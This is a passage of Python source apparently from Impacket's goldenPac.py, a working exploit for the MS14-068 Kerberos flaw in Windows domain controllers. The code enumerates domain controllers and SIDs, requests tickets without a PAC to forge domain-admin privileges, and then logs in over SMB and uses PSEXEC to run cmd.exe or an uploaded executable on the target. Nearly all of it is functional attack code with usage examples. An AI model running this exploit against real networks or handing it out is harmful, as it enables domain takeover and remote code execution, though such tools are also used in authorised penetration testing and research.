        # the TGS session key (Section 5.4.1)
        encryptedEncodedIfRelevant = cipher.encrypt(sessionKey, 4, encodedIfRelevant, None)

        tgsReq = TGS_REQ()
        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append( constants.KDCOptions.forwardable.value )
        opts.append( constants.KDCOptions.renewable.value )
        opts.append( constants.KDCOptions.proxiable.value )

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.SystemRandom().getrandbits(31)
        seq_set_iter(reqBody, 'etype', (cipher.enctype,))
        reqBody['enc-authorization-data'] = None
        reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
        reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] =  constants.encodeFlags(opts)
        seq_set(apReq,'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1( decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow() 
        authenticator['cusec'] =  now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = None
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq['pvno'] =  5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = None
        tgsReq['padata'][0] = None
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = False
        encodedPacRequest = encoder.encode(pacRequest)

        tgsReq['padata'][1] = None
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        tgsReq['padata'][1]['padata-value'] = encodedPacRequest

        message = encoder.encode(tgsReq)

        r = sendReceive(message, domain, kdcHost)

        # Get the session key
        tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]
        cipherText = tgs['enc-part']['cipher']

        # Key Usage 8
        # TGS-REP encrypted part (includes application session
        # key), encrypted with the TGS session key (Section 5.4.2)
        plainText = cipher.decrypt(sessionKey, 8, str(cipherText))

        encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]

        newSessionKey = Key(cipher.enctype, str(encTGSRepPart['key']['keyvalue']))
    
        return r, cipher, sessionKey, newSessionKey

    def getForestSid(self):
        logging.debug('Calling NRPC DsrGetDcNameEx()')

        stringBinding = r'ncacn_np:%s[\pipe\netlogon]' % self.__kdcHost

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(MSRPC_UUID_NRPC)

        resp = hDsrGetDcNameEx(dce, NULL, NULL, NULL, NULL, 0)
        forestName = resp['DomainControllerInfo']['DnsForestName'][:-1]
        logging.debug('DNS Forest name is %s' % forestName)
        dce.disconnect()

        logging.debug('Calling LSAT hLsarQueryInformationPolicy2()')

        stringBinding = r'ncacn_np:%s[\pipe\lsarpc]' % forestName

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(MSRPC_UUID_LSAT)

        resp = hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | POLICY_LOOKUP_NAMES)
        policyHandle = resp['PolicyHandle']

        resp = hLsarQueryInformationPolicy2(dce, policyHandle, POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
        dce.disconnect()

        forestSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
        logging.info("Forest SID: %s"% forestSid)

        return forestSid

    def getDomainControllers(self):
        logging.debug('Calling DRSDomainControllerInfo()')

        stringBinding = epm.hept_map(self.__domain, MSRPC_UUID_DRSUAPI, protocol = 'ncacn_ip_tcp')

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)

        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        dce.connect()
        dce.bind(MSRPC_UUID_DRSUAPI)

        request = DRSBind()
        request['puuidClientDsa'] = NTDSAPI_CLIENT_GUID
        drs = DRS_EXTENSIONS_INT()
        drs['cb'] = len(drs) #- 4
        drs['dwFlags'] = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION
        drs['SiteObjGuid'] = NULLGUID
        drs['Pid'] = 0
        drs['dwReplEpoch'] = 0
        drs['dwFlagsExt'] = 0
        drs['ConfigObjGUID'] = NULLGUID
        drs['dwExtCaps'] = 127
        request['pextClient']['cb'] = len(drs)
        request['pextClient']['rgb'] = list(str(drs))
        resp = dce.request(request)

        dcs = hDRSDomainControllerInfo(dce,  resp['phDrs'], self.__domain, 1)

        dce.disconnect()
        domainControllers = list()
        for dc in dcs['pmsgOut']['V1']['rItems']:
            logging.debug('Found domain controller %s' % dc['DnsHostName'][:-1])
            domainControllers.append(dc['DnsHostName'][:-1])

        return domainControllers

    def getUserSID(self):
        stringBinding = r'ncacn_np:%s[\pipe\samr]' % self.__kdcHost

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)

        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(dce)
        serverHandle = resp['ServerHandle']
        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, self.__domain)
        domainId = resp['DomainId']
        resp = samr.hSamrOpenDomain(dce, serverHandle, domainId = domainId)
        domainHandle = resp['DomainHandle']
        resp = samr.hSamrLookupNamesInDomain(dce, domainHandle, (self.__username,))
        # Let's pick the relative ID
        rid = resp['RelativeIds']['Element'][0]['Data']
        logging.info("User SID: %s-%s"% (domainId.formatCanonical(), rid))
        return domainId, rid

    def exploit(self):
        if self.__kdcHost is None:
            getDCs = True
            self.__kdcHost = self.__domain
        else:
            getDCs = False

        self.__domainSid, self.__rid = self.getUserSID()
        try:
            self.__forestSid = self.getForestSid()
        except Exception, e:
            # For some reason we couldn't get the forest data. No problem, we can still continue
            # Only drawback is we won't get forest admin if successful
            logging.error('Couldn\'t get forest info (%s), continuing' % str(e))
            self.__forestSid = None

        if getDCs is False:
            # User specified a DC already, no need to get the list
            self.__domainControllers.append(self.__kdcHost)
        else:
            self.__domainControllers = self.getDomainControllers()

        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        for dc in self.__domainControllers:
            logging.info('Attacking domain controller %s' % dc)
            self.__kdcHost = dc
            exception = None
            while True:
                try:
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
                except KerberosError, e:
                    if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                        # We might face this if the target does not support AES (most probably
                        # Windows XP). So, if that's the case we'll force using RC4 by converting
                        # the password to lm/nt hashes and hope for the best. If that's already
                        # done, byebye.
                        if self.__lmhash is '' and self.__nthash is '':
                            from impacket.ntlm import compute_lmhash, compute_nthash
                            self.__lmhash = compute_lmhash(self.__password)
                            self.__nthash = compute_nthash(self.__password)
                            continue
                        else:
                            exception = str(e)
                            break
                    else:
                        exception = str(e)
                        break

                # So, we have the TGT, now extract the new session key and finish
                asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]

                # If the cypher in use != RC4 there's gotta be a salt for us to use
                salt = ''
                if asRep['padata']:
                    for pa in asRep['padata']:
                        if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                            etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
                            salt = str(etype2['salt'])

                cipherText = asRep['enc-part']['cipher']

                # Key Usage 3
                # AS-REP encrypted part (includes TGS session key or
                # application session key), encrypted with the client key
                # (Section 5.4.2)
                if self.__nthash != '':
                    key = Key(cipher.enctype,self.__nthash)
                else:
                    key = cipher.string_to_key(self.__password, salt, None)

                plainText = cipher.decrypt(key, 3, str(cipherText))
                encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
                authTime = encASRepPart['authtime']

                serverName = Principal('krbtgt/%s' % self.__domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)

                # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
                serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
                try:
                    tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
                except KerberosError, e:
                    if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                        # We might face this if the target does not support AES (most probably
                        # Windows XP). So, if that's the case we'll force using RC4 by converting
                        # the password to lm/nt hashes and hope for the best. If that's already
                        # done, byebye.
                        if self.__lmhash is '' and self.__nthash is '':
                            from impacket.ntlm import compute_lmhash, compute_nthash
                            self.__lmhash = compute_lmhash(self.__password)
                            self.__nthash = compute_nthash(self.__password)
                        else:
                            exception = str(e)
                            break
                    else:
                        exception = str(e)
                        break
                else:
                    # Everything went well, let's save the ticket if asked and leave
                    if self.__writeTGT is not None:
                        from impacket.krb5.ccache import CCache
                        ccache = CCache()
                        ccache.fromTGS(tgs, oldSessionKey, sessionKey)
                        ccache.saveFile(self.__writeTGT)
                    break
            if exception is None:
                # Success!
                logging.info('%s found vulnerable!' % dc)
                break
            else:
                logging.info('%s seems not vulnerable (%s)' % (dc, exception))

        if exception is None:
            TGS = {}
            TGS['KDC_REP'] = tgsCIFS
            TGS['cipher'] = cipher
            TGS['oldSessionKey'] = oldSessionKeyCIFS
            TGS['sessionKey'] = sessionKeyCIFS

            from impacket.smbconnection import SMBConnection
            if self.__targetIp is None:
                s = SMBConnection('*SMBSERVER', self.__target)
            else:
                s = SMBConnection('*SMBSERVER', self.__targetIp)
            s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS, useCache=False)

            if self.__command != 'None':
                executer = PSEXEC(self.__command, username, domain, s, TGS, self.__copyFile)
                executer.run(self.__target)

if __name__ == '__main__':
    # Init the example's logger theme
    logger.init()
    import argparse
    import sys
    try:
        import pyasn1
    except ImportError:
         logging.critical('This module needs pyasn1 installed')
         logging.critical('You can get it from https://pypi.python.org/pypi/pyasn1')
         sys.exit(1)
    import datetime
    from calendar import timegm
    from time import strptime
    from impacket import version
    from impacket.smbserver import getFileTime
    from impacket.dcerpc.v5 import samr
    from impacket.dcerpc.v5 import transport
    from impacket.krb5.types import Principal, Ticket, KerberosTime
    from impacket.krb5 import constants
    from impacket.krb5.kerberosv5 import sendReceive, getKerberosTGT, getKerberosTGS, KerberosError
    from impacket.krb5.asn1 import AS_REP, TGS_REQ, AP_REQ, TGS_REP, Authenticator, EncASRepPart, AuthorizationData, AD_IF_RELEVANT, seq_set, seq_set_iter, KERB_PA_PAC_REQUEST, \
        EncTGSRepPart, ETYPE_INFO2_ENTRY
    from impacket.krb5.crypto import Key
    from impacket.dcerpc.v5.ndr import NDRULONG
    from impacket.dcerpc.v5.samr import NULL, GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
    from pyasn1.codec.der import decoder, encoder
    from Crypto.Hash import MD5

    print version.BANNER

    parser = argparse.ArgumentParser(add_help = True, description = "MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the target or saves the TGT for later use.")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName>')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
    parser.add_argument('-c', action='store',metavar = "pathname",  help='uploads the filename for later execution, arguments are passed in the command option')
    parser.add_argument('-w', action='store',metavar = "pathname",  help='writes the golden ticket in CCache format into the <pathname> file')
    parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller (needed to get the user''s SID). If ommited it use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-ip', action='store',metavar = "ip address",  help='IP Address of the target host you want to attack. If ommited it will use the targetName parameter')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    if len(sys.argv)==1:
        parser.print_help()
        print "\nExamples: "
        print "\tpython goldenPac domain.net/normaluser@domain-host\n"
        print "\tthe password will be asked, or\n"
        print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n"
        print "\tif domain.net and/or domain-machine do not resolve, add them"
        print "\tto the hosts file or explicity specify the domain IP (e.g. 1.1.1.1) and target IP:\n"
        print "\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n"
        print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
        print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n"
        sys.exit(1)
 
    options = parser.parse_args()

    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

    #In case the password contains '@'
    if '@' in address:
        password = password + '@' + address.rpartition('@')[0]
        address = address.rpartition('@')[2]

    if domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")

    commands = ' '.join(options.command)
    if commands == ' ':
        commands = 'cmd.exe'

    dumper = MS14_068(address, options.target_ip, username, password, domain, options.hashes, commands, options.c, options.w, options.dc_ip)

    try:
        dumper.exploit()
    except Exception, e:
        #import traceback
        #print traceback.print_exc()
        logging.critical(str(e))

